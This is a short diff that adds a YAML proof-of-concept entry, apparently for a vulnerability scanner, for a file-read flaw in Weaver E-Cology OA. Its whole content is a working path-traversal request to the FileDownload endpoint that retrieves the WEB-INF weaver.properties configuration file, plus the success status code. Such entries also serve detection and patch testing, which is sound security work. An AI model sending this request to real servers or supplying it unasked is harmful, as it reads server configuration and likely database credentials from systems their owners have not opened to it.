@@ -1,0 +1,3 @@
+name: "泛微OA-E-Cology-FileDownload文件读取漏洞"
+poc: "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties"
+status_code: 200
